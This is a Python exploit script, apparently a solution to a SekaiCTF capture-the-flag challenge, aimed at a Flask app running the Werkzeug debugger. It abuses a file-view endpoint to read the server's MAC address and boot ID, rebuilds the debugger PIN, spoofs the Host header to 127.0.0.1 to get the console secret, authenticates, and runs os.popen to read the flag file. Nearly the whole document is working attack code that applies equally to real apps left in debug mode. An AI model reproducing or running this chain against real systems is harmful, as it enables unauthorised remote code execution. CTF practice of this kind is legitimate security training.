from requests import get
import hashlib
from itertools import chain
import re

HOST = "https://my-flask-app.chals.sekai.team:1337"

def getfile(filename):
    try:
        response = get(f"{HOST}/view?filename={filename}")
        return response.text
    except Exception as e:
        print(f"Error: {e}")
        return None
    
def get_pin(probably_public_bits, private_bits):
    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'cookiesalt')

    cookie_name = '__wzd' + h.hexdigest()[:20]

    num = None
    if num is None:
        h.update(b'pinsalt')
        num = ('%09d' % int(h.hexdigest(), 16))[:9]

    rv =None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                            for x in range(0, len(num), group_size))
                break
        else:
            rv = num

    return rv

def get_secret():
    response = get(f"{HOST}/console", headers={"Host": "127.0.0.1"})
    match = re.search(r'SECRET\s*=\s*["\']([^"\']+)["\']', response.text)

    if match:
        return match.group(1)
    return None

def authenticate(secret, pin):
    response = get(f"{HOST}/console?__debugger__=yes&cmd=pinauth&pin={pin}&s={secret}", headers={"Host": "127.0.0.1"})
    return response.headers.get("Set-Cookie")

def execute_code(cookie, code, secret):
    response = get(f"{HOST}/console?__debugger__=yes&cmd={code}&frm=0&s={secret}", headers={"Host": "127.0.0.1", "Cookie": cookie})
    return response.text

if __name__ == "__main__":

    mac = getfile("/sys/class/net/eth0/address")
    mac = str(int("0x" + "".join(mac.split(":")).strip(), 16))
    boot_id = getfile("/proc/sys/kernel/random/boot_id").strip()
    
    # should be default
    probably_public_bits = [
        'nobody',
        'flask.app',
        'Flask',
        '/usr/local/lib/python3.11/site-packages/flask/app.py' # change this to the path of the flask app
    ]

    private_bits = [
        mac,
        boot_id
    ]

    print("Found Console PIN: ", get_pin(probably_public_bits, private_bits))

    secret = get_secret()
    print("Found Secret: ", secret)

    cookie = authenticate(secret, get_pin(probably_public_bits, private_bits))
    print("Found Cookie: ", cookie)

    print("Executing code...")

    output = execute_code(cookie, "__import__('os').popen('cat /flag*').read()", secret)
    
    match = re.search(r'SEKAI\{.*\}', output)
    if match:
        print("Found flag: ", match.group(0))
    else:
        print("No flag found")

    print("Done")
